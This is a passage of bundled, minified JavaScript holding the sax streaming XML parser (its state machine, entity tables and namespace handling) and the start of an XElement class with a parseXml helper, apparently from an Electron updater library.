              I.cdata !== "" && (N(I, "oncdata", I.cdata), (I.cdata = "")),
              I.script !== "" && (N(I, "onscript", I.script), (I.script = ""));
          }
          h.prototype = {
            end: function () {
              k(this);
            },
            write: Ee,
            resume: function () {
              return (this.error = null), this;
            },
            close: function () {
              return this.write(null);
            },
            flush: function () {
              r(this);
            },
          };
          var l;
          try {
            l = require("stream").Stream;
          } catch {
            l = function () { };
          }
          l || (l = function () { });
          var e = i.EVENTS.filter(function (I) {
            return I !== "error" && I !== "end";
          });
          function o(I, T) {
            return new n(I, T);
          }
          function n(I, T) {
            if (!(this instanceof n)) return new n(I, T);
            l.apply(this),
              (this._parser = new h(I, T)),
              (this.writable = !0),
              (this.readable = !0);
            var j = this;
            (this._parser.onend = function () {
              j.emit("end");
            }),
              (this._parser.onerror = function (U) {
                j.emit("error", U), (j._parser.error = null);
              }),
              (this._decoder = null),
              e.forEach(function (U) {
                Object.defineProperty(j, "on" + U, {
                  get: function () {
                    return j._parser["on" + U];
                  },
                  set: function (le) {
                    if (!le)
                      return (
                        j.removeAllListeners(U), (j._parser["on" + U] = le), le
                      );
                    j.on(U, le);
                  },
                  enumerable: !0,
                  configurable: !1,
                });
              });
          }
          (n.prototype = Object.create(l.prototype, {
            constructor: { value: n },
          })),
            (n.prototype.write = function (I) {
              if (
                typeof Buffer == "function" &&
                typeof Buffer.isBuffer == "function" &&
                Buffer.isBuffer(I)
              ) {
                if (!this._decoder) {
                  var T = Qc.StringDecoder;
                  this._decoder = new T("utf8");
                }
                I = this._decoder.write(I);
              }
              return this._parser.write(I.toString()), this.emit("data", I), !0;
            }),
            (n.prototype.end = function (I) {
              return I && I.length && this.write(I), this._parser.end(), !0;
            }),
            (n.prototype.on = function (I, T) {
              var j = this;
              return (
                !j._parser["on" + I] &&
                e.indexOf(I) !== -1 &&
                (j._parser["on" + I] = function () {
                  var U =
                    arguments.length === 1
                      ? [arguments[0]]
                      : Array.apply(null, arguments);
                  U.splice(0, 0, I), j.emit.apply(j, U);
                }),
                l.prototype.on.call(j, I, T)
              );
            });
          var s = "[CDATA[",
            u = "DOCTYPE",
            m = "http://www.w3.org/XML/1998/namespace",
            E = "http://www.w3.org/2000/xmlns/",
            y = { xml: m, xmlns: E },
            p =
              /[:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD]/,
            A =
              /[:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\u00B7\u0300-\u036F\u203F-\u2040.\d-]/,
            S =
              /[#:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD]/,
            b =
              /[#:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\u00B7\u0300-\u036F\u203F-\u2040.\d-]/;
          function R(I) {
            return (
              I === " " ||
              I ===
              `
` ||
              I === "\r" ||
              I === "	"
            );
          }
          function C(I) {
            return I === '"' || I === "'";
          }
          function v(I) {
            return I === ">" || R(I);
          }
          function w(I, T) {
            return I.test(T);
          }
          function _(I, T) {
            return !w(I, T);
          }
          var g = 0;
          (i.STATE = {
            BEGIN: g++,
            BEGIN_WHITESPACE: g++,
            TEXT: g++,
            TEXT_ENTITY: g++,
            OPEN_WAKA: g++,
            SGML_DECL: g++,
            SGML_DECL_QUOTED: g++,
            DOCTYPE: g++,
            DOCTYPE_QUOTED: g++,
            DOCTYPE_DTD: g++,
            DOCTYPE_DTD_QUOTED: g++,
            COMMENT_STARTING: g++,
            COMMENT: g++,
            COMMENT_ENDING: g++,
            COMMENT_ENDED: g++,
            CDATA: g++,
            CDATA_ENDING: g++,
            CDATA_ENDING_2: g++,
            PROC_INST: g++,
            PROC_INST_BODY: g++,
            PROC_INST_ENDING: g++,
            OPEN_TAG: g++,
            OPEN_TAG_SLASH: g++,
            ATTRIB: g++,
            ATTRIB_NAME: g++,
            ATTRIB_NAME_SAW_WHITE: g++,
            ATTRIB_VALUE: g++,
            ATTRIB_VALUE_QUOTED: g++,
            ATTRIB_VALUE_CLOSED: g++,
            ATTRIB_VALUE_UNQUOTED: g++,
            ATTRIB_VALUE_ENTITY_Q: g++,
            ATTRIB_VALUE_ENTITY_U: g++,
            CLOSE_TAG: g++,
            CLOSE_TAG_SAW_WHITE: g++,
            SCRIPT: g++,
            SCRIPT_ENDING: g++,
          }),
            (i.XML_ENTITIES = {
              amp: "&",
              gt: ">",
              lt: "<",
              quot: '"',
              apos: "'",
            }),
            (i.ENTITIES = {
              amp: "&",
              gt: ">",
              lt: "<",
              quot: '"',
              apos: "'",
              AElig: 198,
              Aacute: 193,
              Acirc: 194,
              Agrave: 192,
              Aring: 197,
              Atilde: 195,
              Auml: 196,
              Ccedil: 199,
              ETH: 208,
              Eacute: 201,
              Ecirc: 202,
              Egrave: 200,
              Euml: 203,
              Iacute: 205,
              Icirc: 206,
              Igrave: 204,
              Iuml: 207,
              Ntilde: 209,
              Oacute: 211,
              Ocirc: 212,
              Ograve: 210,
              Oslash: 216,
              Otilde: 213,
              Ouml: 214,
              THORN: 222,
              Uacute: 218,
              Ucirc: 219,
              Ugrave: 217,
              Uuml: 220,
              Yacute: 221,
              aacute: 225,
              acirc: 226,
              aelig: 230,
              agrave: 224,
              aring: 229,
              atilde: 227,
              auml: 228,
              ccedil: 231,
              eacute: 233,
              ecirc: 234,
              egrave: 232,
              eth: 240,
              euml: 235,
              iacute: 237,
              icirc: 238,
              igrave: 236,
              iuml: 239,
              ntilde: 241,
              oacute: 243,
              ocirc: 244,
              ograve: 242,
              oslash: 248,
              otilde: 245,
              ouml: 246,
              szlig: 223,
              thorn: 254,
              uacute: 250,
              ucirc: 251,
              ugrave: 249,
              uuml: 252,
              yacute: 253,
              yuml: 255,
              copy: 169,
              reg: 174,
              nbsp: 160,
              iexcl: 161,
              cent: 162,
              pound: 163,
              curren: 164,
              yen: 165,
              brvbar: 166,
              sect: 167,
              uml: 168,
              ordf: 170,
              laquo: 171,
              not: 172,
              shy: 173,
              macr: 175,
              deg: 176,
              plusmn: 177,
              sup1: 185,
              sup2: 178,
              sup3: 179,
              acute: 180,
              micro: 181,
              para: 182,
              middot: 183,
              cedil: 184,
              ordm: 186,
              raquo: 187,
              frac14: 188,
              frac12: 189,
              frac34: 190,
              iquest: 191,
              times: 215,
              divide: 247,
              OElig: 338,
              oelig: 339,
              Scaron: 352,
              scaron: 353,
              Yuml: 376,
              fnof: 402,
              circ: 710,
              tilde: 732,
              Alpha: 913,
              Beta: 914,
              Gamma: 915,
              Delta: 916,
              Epsilon: 917,
              Zeta: 918,
              Eta: 919,
              Theta: 920,
              Iota: 921,
              Kappa: 922,
              Lambda: 923,
              Mu: 924,
              Nu: 925,
              Xi: 926,
              Omicron: 927,
              Pi: 928,
              Rho: 929,
              Sigma: 931,
              Tau: 932,
              Upsilon: 933,
              Phi: 934,
              Chi: 935,
              Psi: 936,
              Omega: 937,
              alpha: 945,
              beta: 946,
              gamma: 947,
              delta: 948,
              epsilon: 949,
              zeta: 950,
              eta: 951,
              theta: 952,
              iota: 953,
              kappa: 954,
              lambda: 955,
              mu: 956,
              nu: 957,
              xi: 958,
              omicron: 959,
              pi: 960,
              rho: 961,
              sigmaf: 962,
              sigma: 963,
              tau: 964,
              upsilon: 965,
              phi: 966,
              chi: 967,
              psi: 968,
              omega: 969,
              thetasym: 977,
              upsih: 978,
              piv: 982,
              ensp: 8194,
              emsp: 8195,
              thinsp: 8201,
              zwnj: 8204,
              zwj: 8205,
              lrm: 8206,
              rlm: 8207,
              ndash: 8211,
              mdash: 8212,
              lsquo: 8216,
              rsquo: 8217,
              sbquo: 8218,
              ldquo: 8220,
              rdquo: 8221,
              bdquo: 8222,
              dagger: 8224,
              Dagger: 8225,
              bull: 8226,
              hellip: 8230,
              permil: 8240,
              prime: 8242,
              Prime: 8243,
              lsaquo: 8249,
              rsaquo: 8250,
              oline: 8254,
              frasl: 8260,
              euro: 8364,
              image: 8465,
              weierp: 8472,
              real: 8476,
              trade: 8482,
              alefsym: 8501,
              larr: 8592,
              uarr: 8593,
              rarr: 8594,
              darr: 8595,
              harr: 8596,
              crarr: 8629,
              lArr: 8656,
              uArr: 8657,
              rArr: 8658,
              dArr: 8659,
              hArr: 8660,
              forall: 8704,
              part: 8706,
              exist: 8707,
              empty: 8709,
              nabla: 8711,
              isin: 8712,
              notin: 8713,
              ni: 8715,
              prod: 8719,
              sum: 8721,
              minus: 8722,
              lowast: 8727,
              radic: 8730,
              prop: 8733,
              infin: 8734,
              ang: 8736,
              and: 8743,
              or: 8744,
              cap: 8745,
              cup: 8746,
              int: 8747,
              there4: 8756,
              sim: 8764,
              cong: 8773,
              asymp: 8776,
              ne: 8800,
              equiv: 8801,
              le: 8804,
              ge: 8805,
              sub: 8834,
              sup: 8835,
              nsub: 8836,
              sube: 8838,
              supe: 8839,
              oplus: 8853,
              otimes: 8855,
              perp: 8869,
              sdot: 8901,
              lceil: 8968,
              rceil: 8969,
              lfloor: 8970,
              rfloor: 8971,
              lang: 9001,
              rang: 9002,
              loz: 9674,
              spades: 9824,
              clubs: 9827,
              hearts: 9829,
              diams: 9830,
            }),
            Object.keys(i.ENTITIES).forEach(function (I) {
              var T = i.ENTITIES[I],
                j = typeof T == "number" ? String.fromCharCode(T) : T;
              i.ENTITIES[I] = j;
            });
          for (var D in i.STATE) i.STATE[i.STATE[D]] = D;
          g = i.STATE;
          function O(I, T, j) {
            I[T] && I[T](j);
          }
          function N(I, T, j) {
            I.textNode && L(I), O(I, T, j);
          }
          function L(I) {
            (I.textNode = F(I.opt, I.textNode)),
              I.textNode && O(I, "ontext", I.textNode),
              (I.textNode = "");
          }
          function F(I, T) {
            return (
              I.trim && (T = T.trim()),
              I.normalize && (T = T.replace(/\s+/g, " ")),
              T
            );
          }
          function $(I, T) {
            return (
              L(I),
              I.trackPosition &&
              (T +=
                `
Line: ` +
                I.line +
                `
Column: ` +
                I.column +
                `
Char: ` +
                I.c),
              (T = new Error(T)),
              (I.error = T),
              O(I, "onerror", T),
              I
            );
          }
          function k(I) {
            return (
              I.sawRoot && !I.closedRoot && M(I, "Unclosed root tag"),
              I.state !== g.BEGIN &&
              I.state !== g.BEGIN_WHITESPACE &&
              I.state !== g.TEXT &&
              $(I, "Unexpected end"),
              L(I),
              (I.c = ""),
              (I.closed = !0),
              O(I, "onend"),
              h.call(I, I.strict, I.opt),
              I
            );
          }
          function M(I, T) {
            if (typeof I != "object" || !(I instanceof h))
              throw new Error("bad call to strictFail");
            I.strict && $(I, T);
          }
          function K(I) {
            I.strict || (I.tagName = I.tagName[I.looseCase]());
            var T = I.tags[I.tags.length - 1] || I,
              j = (I.tag = { name: I.tagName, attributes: {} });
            I.opt.xmlns && (j.ns = T.ns),
              (I.attribList.length = 0),
              N(I, "onopentagstart", j);
          }
          function G(I, T) {
            var j = I.indexOf(":"),
              U = j < 0 ? ["", I] : I.split(":"),
              le = U[0],
              ge = U[1];
            return (
              T && I === "xmlns" && ((le = "xmlns"), (ge = "")),
              { prefix: le, local: ge }
            );
          }
          function ne(I) {
            if (
              (I.strict || (I.attribName = I.attribName[I.looseCase]()),
                I.attribList.indexOf(I.attribName) !== -1 ||
                I.tag.attributes.hasOwnProperty(I.attribName))
            ) {
              I.attribName = I.attribValue = "";
              return;
            }
            if (I.opt.xmlns) {
              var T = G(I.attribName, !0),
                j = T.prefix,
                U = T.local;
              if (j === "xmlns")
                if (U === "xml" && I.attribValue !== m)
                  M(
                    I,
                    "xml: prefix must be bound to " +
                    m +
                    `
Actual: ` +
                    I.attribValue
                  );
                else if (U === "xmlns" && I.attribValue !== E)
                  M(
                    I,
                    "xmlns: prefix must be bound to " +
                    E +
                    `
Actual: ` +
                    I.attribValue
                  );
                else {
                  var le = I.tag,
                    ge = I.tags[I.tags.length - 1] || I;
                  le.ns === ge.ns && (le.ns = Object.create(ge.ns)),
                    (le.ns[U] = I.attribValue);
                }
              I.attribList.push([I.attribName, I.attribValue]);
            } else
              (I.tag.attributes[I.attribName] = I.attribValue),
                N(I, "onattribute", {
                  name: I.attribName,
                  value: I.attribValue,
                });
            I.attribName = I.attribValue = "";
          }
          function se(I, T) {
            if (I.opt.xmlns) {
              var j = I.tag,
                U = G(I.tagName);
              (j.prefix = U.prefix),
                (j.local = U.local),
                (j.uri = j.ns[U.prefix] || ""),
                j.prefix &&
                !j.uri &&
                (M(
                  I,
                  "Unbound namespace prefix: " + JSON.stringify(I.tagName)
                ),
                  (j.uri = U.prefix));
              var le = I.tags[I.tags.length - 1] || I;
              j.ns &&
                le.ns !== j.ns &&
                Object.keys(j.ns).forEach(function (B) {
                  N(I, "onopennamespace", { prefix: B, uri: j.ns[B] });
                });
              for (var ge = 0, me = I.attribList.length; ge < me; ge++) {
                var Se = I.attribList[ge],
                  _e = Se[0],
                  Le = Se[1],
                  Ie = G(_e, !0),
                  je = Ie.prefix,
                  _t = Ie.local,
                  ct = je === "" ? "" : j.ns[je] || "",
                  d = { name: _e, value: Le, prefix: je, local: _t, uri: ct };
                je &&
                  je !== "xmlns" &&
                  !ct &&
                  (M(I, "Unbound namespace prefix: " + JSON.stringify(je)),
                    (d.uri = je)),
                  (I.tag.attributes[_e] = d),
                  N(I, "onattribute", d);
              }
              I.attribList.length = 0;
            }
            (I.tag.isSelfClosing = !!T),
              (I.sawRoot = !0),
              I.tags.push(I.tag),
              N(I, "onopentag", I.tag),
              T ||
              (!I.noscript && I.tagName.toLowerCase() === "script"
                ? (I.state = g.SCRIPT)
                : (I.state = g.TEXT),
                (I.tag = null),
                (I.tagName = "")),
              (I.attribName = I.attribValue = ""),
              (I.attribList.length = 0);
          }
          function ce(I) {
            if (!I.tagName) {
              M(I, "Weird empty close tag."),
                (I.textNode += "</>"),
                (I.state = g.TEXT);
              return;
            }
            if (I.script) {
              if (I.tagName !== "script") {
                (I.script += "</" + I.tagName + ">"),
                  (I.tagName = ""),
                  (I.state = g.SCRIPT);
                return;
              }
              N(I, "onscript", I.script), (I.script = "");
            }
            var T = I.tags.length,
              j = I.tagName;
            I.strict || (j = j[I.looseCase]());
            for (var U = j; T--;) {
              var le = I.tags[T];
              if (le.name !== U) M(I, "Unexpected close tag");
              else break;
            }
            if (T < 0) {
              M(I, "Unmatched closing tag: " + I.tagName),
                (I.textNode += "</" + I.tagName + ">"),
                (I.state = g.TEXT);
              return;
            }
            I.tagName = j;
            for (var ge = I.tags.length; ge-- > T;) {
              var me = (I.tag = I.tags.pop());
              (I.tagName = I.tag.name), N(I, "onclosetag", I.tagName);
              var Se = {};
              for (var _e in me.ns) Se[_e] = me.ns[_e];
              var Le = I.tags[I.tags.length - 1] || I;
              I.opt.xmlns &&
                me.ns !== Le.ns &&
                Object.keys(me.ns).forEach(function (Ie) {
                  var je = me.ns[Ie];
                  N(I, "onclosenamespace", { prefix: Ie, uri: je });
                });
            }
            T === 0 && (I.closedRoot = !0),
              (I.tagName = I.attribValue = I.attribName = ""),
              (I.attribList.length = 0),
              (I.state = g.TEXT);
          }
          function ie(I) {
            var T = I.entity,
              j = T.toLowerCase(),
              U,
              le = "";
            return I.ENTITIES[T]
              ? I.ENTITIES[T]
              : I.ENTITIES[j]
                ? I.ENTITIES[j]
                : ((T = j),
                  T.charAt(0) === "#" &&
                  (T.charAt(1) === "x"
                    ? ((T = T.slice(2)),
                      (U = parseInt(T, 16)),
                      (le = U.toString(16)))
                    : ((T = T.slice(1)),
                      (U = parseInt(T, 10)),
                      (le = U.toString(10)))),
                  (T = T.replace(/^0+/, "")),
                  isNaN(U) || le.toLowerCase() !== T
                    ? (M(I, "Invalid character entity"), "&" + I.entity + ";")
                    : String.fromCodePoint(U));
          }
          function Re(I, T) {
            T === "<"
              ? ((I.state = g.OPEN_WAKA), (I.startTagPosition = I.position))
              : R(T) ||
              (M(I, "Non-whitespace before first tag."),
                (I.textNode = T),
                (I.state = g.TEXT));
          }
          function J(I, T) {
            var j = "";
            return T < I.length && (j = I.charAt(T)), j;
          }
          function Ee(I) {
            var T = this;
            if (this.error) throw this.error;
            if (T.closed)
              return $(
                T,
                "Cannot write after close. Assign an onready handler."
              );
            if (I === null) return k(T);
            typeof I == "object" && (I = I.toString());
            for (var j = 0, U = ""; (U = J(I, j++)), (T.c = U), !!U;)
              switch (
              (T.trackPosition &&
                (T.position++,
                  U ===
                    `
`
                    ? (T.line++, (T.column = 0))
                    : T.column++),
                T.state)
              ) {
                case g.BEGIN:
                  if (((T.state = g.BEGIN_WHITESPACE), U === "\uFEFF"))
                    continue;
                  Re(T, U);
                  continue;
                case g.BEGIN_WHITESPACE:
                  Re(T, U);
                  continue;
                case g.TEXT:
                  if (T.sawRoot && !T.closedRoot) {
                    for (var le = j - 1; U && U !== "<" && U !== "&";)
                      (U = J(I, j++)),
                        U &&
                        T.trackPosition &&
                        (T.position++,
                          U ===
                            `
`
                            ? (T.line++, (T.column = 0))
                            : T.column++);
                    T.textNode += I.substring(le, j - 1);
                  }
                  U === "<" && !(T.sawRoot && T.closedRoot && !T.strict)
                    ? ((T.state = g.OPEN_WAKA),
                      (T.startTagPosition = T.position))
                    : (!R(U) &&
                      (!T.sawRoot || T.closedRoot) &&
                      M(T, "Text data outside of root node."),
                      U === "&"
                        ? (T.state = g.TEXT_ENTITY)
                        : (T.textNode += U));
                  continue;
                case g.SCRIPT:
                  U === "<" ? (T.state = g.SCRIPT_ENDING) : (T.script += U);
                  continue;
                case g.SCRIPT_ENDING:
                  U === "/"
                    ? (T.state = g.CLOSE_TAG)
                    : ((T.script += "<" + U), (T.state = g.SCRIPT));
                  continue;
                case g.OPEN_WAKA:
                  if (U === "!") (T.state = g.SGML_DECL), (T.sgmlDecl = "");
                  else if (!R(U))
                    if (w(p, U)) (T.state = g.OPEN_TAG), (T.tagName = U);
                    else if (U === "/")
                      (T.state = g.CLOSE_TAG), (T.tagName = "");
                    else if (U === "?")
                      (T.state = g.PROC_INST),
                        (T.procInstName = T.procInstBody = "");
                    else {
                      if (
                        (M(T, "Unencoded <"),
                          T.startTagPosition + 1 < T.position)
                      ) {
                        var ge = T.position - T.startTagPosition;
                        U = new Array(ge).join(" ") + U;
                      }
                      (T.textNode += "<" + U), (T.state = g.TEXT);
                    }
                  continue;
                case g.SGML_DECL:
                  if (T.sgmlDecl + U === "--") {
                    (T.state = g.COMMENT), (T.comment = ""), (T.sgmlDecl = "");
                    continue;
                  }
                  T.doctype && T.doctype !== !0 && T.sgmlDecl
                    ? ((T.state = g.DOCTYPE_DTD),
                      (T.doctype += "<!" + T.sgmlDecl + U),
                      (T.sgmlDecl = ""))
                    : (T.sgmlDecl + U).toUpperCase() === s
                      ? (N(T, "onopencdata"),
                        (T.state = g.CDATA),
                        (T.sgmlDecl = ""),
                        (T.cdata = ""))
                      : (T.sgmlDecl + U).toUpperCase() === u
                        ? ((T.state = g.DOCTYPE),
                          (T.doctype || T.sawRoot) &&
                          M(T, "Inappropriately located doctype declaration"),
                          (T.doctype = ""),
                          (T.sgmlDecl = ""))
                        : U === ">"
                          ? (N(T, "onsgmldeclaration", T.sgmlDecl),
                            (T.sgmlDecl = ""),
                            (T.state = g.TEXT))
                          : (C(U) && (T.state = g.SGML_DECL_QUOTED),
                            (T.sgmlDecl += U));
                  continue;
                case g.SGML_DECL_QUOTED:
                  U === T.q && ((T.state = g.SGML_DECL), (T.q = "")),
                    (T.sgmlDecl += U);
                  continue;
                case g.DOCTYPE:
                  U === ">"
                    ? ((T.state = g.TEXT),
                      N(T, "ondoctype", T.doctype),
                      (T.doctype = !0))
                    : ((T.doctype += U),
                      U === "["
                        ? (T.state = g.DOCTYPE_DTD)
                        : C(U) && ((T.state = g.DOCTYPE_QUOTED), (T.q = U)));
                  continue;
                case g.DOCTYPE_QUOTED:
                  (T.doctype += U),
                    U === T.q && ((T.q = ""), (T.state = g.DOCTYPE));
                  continue;
                case g.DOCTYPE_DTD:
                  U === "]"
                    ? ((T.doctype += U), (T.state = g.DOCTYPE))
                    : U === "<"
                      ? ((T.state = g.OPEN_WAKA),
                        (T.startTagPosition = T.position))
                      : C(U)
                        ? ((T.doctype += U),
                          (T.state = g.DOCTYPE_DTD_QUOTED),
                          (T.q = U))
                        : (T.doctype += U);
                  continue;
                case g.DOCTYPE_DTD_QUOTED:
                  (T.doctype += U),
                    U === T.q && ((T.state = g.DOCTYPE_DTD), (T.q = ""));
                  continue;
                case g.COMMENT:
                  U === "-" ? (T.state = g.COMMENT_ENDING) : (T.comment += U);
                  continue;
                case g.COMMENT_ENDING:
                  U === "-"
                    ? ((T.state = g.COMMENT_ENDED),
                      (T.comment = F(T.opt, T.comment)),
                      T.comment && N(T, "oncomment", T.comment),
                      (T.comment = ""))
                    : ((T.comment += "-" + U), (T.state = g.COMMENT));
                  continue;
                case g.COMMENT_ENDED:
                  U !== ">"
                    ? (M(T, "Malformed comment"),
                      (T.comment += "--" + U),
                      (T.state = g.COMMENT))
                    : T.doctype && T.doctype !== !0
                      ? (T.state = g.DOCTYPE_DTD)
                      : (T.state = g.TEXT);
                  continue;
                case g.CDATA:
                  U === "]" ? (T.state = g.CDATA_ENDING) : (T.cdata += U);
                  continue;
                case g.CDATA_ENDING:
                  U === "]"
                    ? (T.state = g.CDATA_ENDING_2)
                    : ((T.cdata += "]" + U), (T.state = g.CDATA));
                  continue;
                case g.CDATA_ENDING_2:
                  U === ">"
                    ? (T.cdata && N(T, "oncdata", T.cdata),
                      N(T, "onclosecdata"),
                      (T.cdata = ""),
                      (T.state = g.TEXT))
                    : U === "]"
                      ? (T.cdata += "]")
                      : ((T.cdata += "]]" + U), (T.state = g.CDATA));
                  continue;
                case g.PROC_INST:
                  U === "?"
                    ? (T.state = g.PROC_INST_ENDING)
                    : R(U)
                      ? (T.state = g.PROC_INST_BODY)
                      : (T.procInstName += U);
                  continue;
                case g.PROC_INST_BODY:
                  if (!T.procInstBody && R(U)) continue;
                  U === "?"
                    ? (T.state = g.PROC_INST_ENDING)
                    : (T.procInstBody += U);
                  continue;
                case g.PROC_INST_ENDING:
                  U === ">"
                    ? (N(T, "onprocessinginstruction", {
                      name: T.procInstName,
                      body: T.procInstBody,
                    }),
                      (T.procInstName = T.procInstBody = ""),
                      (T.state = g.TEXT))
                    : ((T.procInstBody += "?" + U),
                      (T.state = g.PROC_INST_BODY));
                  continue;
                case g.OPEN_TAG:
                  w(A, U)
                    ? (T.tagName += U)
                    : (K(T),
                      U === ">"
                        ? se(T)
                        : U === "/"
                          ? (T.state = g.OPEN_TAG_SLASH)
                          : (R(U) || M(T, "Invalid character in tag name"),
                            (T.state = g.ATTRIB)));
                  continue;
                case g.OPEN_TAG_SLASH:
                  U === ">"
                    ? (se(T, !0), ce(T))
                    : (M(T, "Forward-slash in opening tag not followed by >"),
                      (T.state = g.ATTRIB));
                  continue;
                case g.ATTRIB:
                  if (R(U)) continue;
                  U === ">"
                    ? se(T)
                    : U === "/"
                      ? (T.state = g.OPEN_TAG_SLASH)
                      : w(p, U)
                        ? ((T.attribName = U),
                          (T.attribValue = ""),
                          (T.state = g.ATTRIB_NAME))
                        : M(T, "Invalid attribute name");
                  continue;
                case g.ATTRIB_NAME:
                  U === "="
                    ? (T.state = g.ATTRIB_VALUE)
                    : U === ">"
                      ? (M(T, "Attribute without value"),
                        (T.attribValue = T.attribName),
                        ne(T),
                        se(T))
                      : R(U)
                        ? (T.state = g.ATTRIB_NAME_SAW_WHITE)
                        : w(A, U)
                          ? (T.attribName += U)
                          : M(T, "Invalid attribute name");
                  continue;
                case g.ATTRIB_NAME_SAW_WHITE:
                  if (U === "=") T.state = g.ATTRIB_VALUE;
                  else {
                    if (R(U)) continue;
                    M(T, "Attribute without value"),
                      (T.tag.attributes[T.attribName] = ""),
                      (T.attribValue = ""),
                      N(T, "onattribute", { name: T.attribName, value: "" }),
                      (T.attribName = ""),
                      U === ">"
                        ? se(T)
                        : w(p, U)
                          ? ((T.attribName = U), (T.state = g.ATTRIB_NAME))
                          : (M(T, "Invalid attribute name"),
                            (T.state = g.ATTRIB));
                  }
                  continue;
                case g.ATTRIB_VALUE:
                  if (R(U)) continue;
                  C(U)
                    ? ((T.q = U), (T.state = g.ATTRIB_VALUE_QUOTED))
                    : (T.opt.unquotedAttributeValues ||
                      $(T, "Unquoted attribute value"),
                      (T.state = g.ATTRIB_VALUE_UNQUOTED),
                      (T.attribValue = U));
                  continue;
                case g.ATTRIB_VALUE_QUOTED:
                  if (U !== T.q) {
                    U === "&"
                      ? (T.state = g.ATTRIB_VALUE_ENTITY_Q)
                      : (T.attribValue += U);
                    continue;
                  }
                  ne(T), (T.q = ""), (T.state = g.ATTRIB_VALUE_CLOSED);
                  continue;
                case g.ATTRIB_VALUE_CLOSED:
                  R(U)
                    ? (T.state = g.ATTRIB)
                    : U === ">"
                      ? se(T)
                      : U === "/"
                        ? (T.state = g.OPEN_TAG_SLASH)
                        : w(p, U)
                          ? (M(T, "No whitespace between attributes"),
                            (T.attribName = U),
                            (T.attribValue = ""),
                            (T.state = g.ATTRIB_NAME))
                          : M(T, "Invalid attribute name");
                  continue;
                case g.ATTRIB_VALUE_UNQUOTED:
                  if (!v(U)) {
                    U === "&"
                      ? (T.state = g.ATTRIB_VALUE_ENTITY_U)
                      : (T.attribValue += U);
                    continue;
                  }
                  ne(T), U === ">" ? se(T) : (T.state = g.ATTRIB);
                  continue;
                case g.CLOSE_TAG:
                  if (T.tagName)
                    U === ">"
                      ? ce(T)
                      : w(A, U)
                        ? (T.tagName += U)
                        : T.script
                          ? ((T.script += "</" + T.tagName),
                            (T.tagName = ""),
                            (T.state = g.SCRIPT))
                          : (R(U) || M(T, "Invalid tagname in closing tag"),
                            (T.state = g.CLOSE_TAG_SAW_WHITE));
                  else {
                    if (R(U)) continue;
                    _(p, U)
                      ? T.script
                        ? ((T.script += "</" + U), (T.state = g.SCRIPT))
                        : M(T, "Invalid tagname in closing tag.")
                      : (T.tagName = U);
                  }
                  continue;
                case g.CLOSE_TAG_SAW_WHITE:
                  if (R(U)) continue;
                  U === ">" ? ce(T) : M(T, "Invalid characters in closing tag");
                  continue;
                case g.TEXT_ENTITY:
                case g.ATTRIB_VALUE_ENTITY_Q:
                case g.ATTRIB_VALUE_ENTITY_U:
                  var me, Se;
                  switch (T.state) {
                    case g.TEXT_ENTITY:
                      (me = g.TEXT), (Se = "textNode");
                      break;
                    case g.ATTRIB_VALUE_ENTITY_Q:
                      (me = g.ATTRIB_VALUE_QUOTED), (Se = "attribValue");
                      break;
                    case g.ATTRIB_VALUE_ENTITY_U:
                      (me = g.ATTRIB_VALUE_UNQUOTED), (Se = "attribValue");
                      break;
                  }
                  if (U === ";") {
                    var _e = ie(T);
                    T.opt.unparsedEntities &&
                      !Object.values(i.XML_ENTITIES).includes(_e)
                      ? ((T.entity = ""), (T.state = me), T.write(_e))
                      : ((T[Se] += _e), (T.entity = ""), (T.state = me));
                  } else
                    w(T.entity.length ? b : S, U)
                      ? (T.entity += U)
                      : (M(T, "Invalid character in entity name"),
                        (T[Se] += "&" + T.entity + U),
                        (T.entity = ""),
                        (T.state = me));
                  continue;
                default:
                  throw new Error(T, "Unknown state: " + T.state);
              }
            return T.position >= T.bufferCheckPosition && f(T), T;
          }
          /*! http://mths.be/fromcodepoint v0.1.0 by @mathias */ String.fromCodePoint ||
            (function () {
              var I = String.fromCharCode,
                T = Math.floor,
                j = function () {
                  var U = 16384,
                    le = [],
                    ge,
                    me,
                    Se = -1,
                    _e = arguments.length;
                  if (!_e) return "";
                  for (var Le = ""; ++Se < _e;) {
                    var Ie = Number(arguments[Se]);
                    if (!isFinite(Ie) || Ie < 0 || Ie > 1114111 || T(Ie) !== Ie)
                      throw RangeError("Invalid code point: " + Ie);
                    Ie <= 65535
                      ? le.push(Ie)
                      : ((Ie -= 65536),
                        (ge = (Ie >> 10) + 55296),
                        (me = (Ie % 1024) + 56320),
                        le.push(ge, me)),
                      (Se + 1 === _e || le.length > U) &&
                      ((Le += I.apply(null, le)), (le.length = 0));
                  }
                  return Le;
                };
              Object.defineProperty
                ? Object.defineProperty(String, "fromCodePoint", {
                  value: j,
                  configurable: !0,
                  writable: !0,
                })
                : (String.fromCodePoint = j);
            })();
        })(a);
      })(Mn)),
    Mn
  );
}
var Za;
function kf() {
  if (Za) return qt;
  (Za = 1),
    Object.defineProperty(qt, "__esModule", { value: !0 }),
    (qt.XElement = void 0),
    (qt.parseXml = r);
  const a = Uf(),
    i = zr();
  class c {
    constructor(e) {
      if (
        ((this.name = e),
          (this.value = ""),
          (this.attributes = null),
          (this.isCData = !1),
          (this.elements = null),
          !e)
      )
        throw (0, i.newError)(
          "Element name cannot be empty",
          "ERR_XML_ELEMENT_NAME_EMPTY"
        );
      if (!f(e))
        throw (0, i.newError)(
          `Invalid element name: ${e}`,
          "ERR_XML_ELEMENT_INVALID_NAME"
        );
    }
    attribute(e) {
      const o = this.attributes === null ? null : this.attributes[e];
      if (o == null)
        throw (0, i.newError)(
          `No attribute "${e}"`,
          "ERR_XML_MISSED_ATTRIBUTE"
        );
      return o;
    }
    removeAttribute(e) {
